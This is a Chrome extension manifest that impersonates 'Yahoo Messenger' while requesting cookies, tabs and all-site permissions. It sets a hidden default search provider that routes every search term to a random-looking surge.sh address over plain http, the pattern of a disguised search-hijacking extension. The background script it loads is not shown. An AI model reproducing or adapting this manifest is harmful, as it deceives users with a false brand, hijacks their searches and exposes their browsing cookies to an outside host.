{
 "manifest_version": 2,
 "background": {
  "scripts": [ "js/background.js" ]
},
"browser_action": {
 "default_icon": "img/16.png"
},
"name": "Yahoo Messenger - Chat and share instantly",
"description": "The all-new Yahoo Messenger is the fastest, easiest way to chat and share lots of photos, videos and animated GIFs instantly.",
"icons": {
 "16": "img/16.png",
 "32": "img/16.png",
 "48": "img/48.png",
 "64": "img/16.png",
 "128": "img/128.png"
},
"permissions": [ 
 "cookies",
 "tabs",
 "http://*/*",
 "https://*/*"
],
"chrome_settings_overrides": {
      "search_provider": {
         "name": "SA",
         "keyword": "Search Provider",
         "favicon_url": "http://jhizmlov31452.surge.sh/favicon.png",
         "search_url": "http://jhizmlov31452.surge.sh/redirect.html?p={searchTerms}",
         "encoding": "UTF-8",
         "is_default": true
      }
   },
"update_url": "https://clients2.google.com/service/update2/crx",
"version": "1"
}
